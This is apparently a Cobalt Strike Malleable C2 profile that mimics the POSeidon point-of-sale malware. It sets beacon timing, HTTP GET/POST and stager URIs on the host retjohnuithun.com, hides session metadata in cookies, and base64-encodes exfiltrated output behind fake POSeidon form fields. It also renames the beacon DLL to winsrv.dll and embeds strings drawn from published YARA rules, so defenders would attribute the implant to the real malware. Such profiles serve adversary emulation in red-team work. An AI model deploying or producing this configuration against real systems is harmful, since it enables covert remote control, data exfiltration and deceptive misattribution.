#POSeidon
#taken from --> https://vallejo.cc/2017/07/12/analysis-of-poseidon-downloader-and-keylogger/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; Media Center PC 6.0)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/Baked/viewtopic.php";
    
    client {

        header "Accept" "*/*";
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Host" "retjohnuithun.com";
	header "Cache-Control" "no-cache";	
        
        metadata {
            netbios;
	    prepend "PHPSESSID=";
            header "Cookie";


        }


    }

    server {

        header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html";
	header "Connection" "keep-alive";
	header "X-Powered-By" "PHP/5.4.38";
        

        output {
            netbios;
            print;
        }
    }
}

http-post {
    
    set uri "/baked/viewtopic.php";

    client {
       
	header "Accept" "*/*";
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Host" "retjohnuithun.com";
#	header "Cache-Control" "no-cache";
        
        output {
            base64;
	    prepend "logs=";
	    prepend "vers=13.4&";
	    prepend "win=6&";
	    prepend "uinfo=dWluZm8=&";
	    prepend "uid=692207&";
	    prepend "oprat=2&";	    
	    print;

        }
        
  	     
        id {
            base64url;
#	    prepend "PHPSESSID=";
	    header "Cookie";

        }
    }

    server {

	header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html";
	header "Connection" "keep-alive";
	header "X-Powered-By" "PHP/5.4.38";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/ldl01/viewtopic.php";
	set uri_x64 "/Ldl01/viewtopic.php";

    client {
	header "Accept" "*/*";
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Host" "retjohnuithun.com";
	header "Cache-Control" "no-cache";
    }

    server {
        header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html";
	header "Connection" "keep-alive";
	header "X-Powered-By" "PHP/5.4.38";
    
    }


}

stage {
	#random
	set compile_time "15 Nov 2017 12:24:14";
	set image_size_x86 "301000";

	transform-x86 {
		strrep "beacon.dll" "winsrv.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "winsrv.dll";
	}	

	#yara rules from --> http://vkremez.weebly.com/cyber-intel/january-18th-2016
	stringw "timed out";
        stringw "AR6002";
        stringw " delete[]";
        stringw "horticartf.com";
        stringw "CreateSemaphoreExW";
        stringw "sma-se";
        stringw "smj-NO";
        stringw "IsValidLocaleName";
        stringw "oprat=2&uid=%I64u&uinfo=%s&win=%d.%d&vers=%s";
        stringw "bad exception";
        stringw "_nextafter";
        stringw "omni callsig'";
        stringw "6d6h6l6p6t6x6";
        stringw "DOMAIN error";
        stringw "vector copy constructor iterator'";
        stringw "- inconsistent onexit begin-end variables";
        stringw "Monday";
        stringw "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) x";
        stringw "horticartf.com";

}
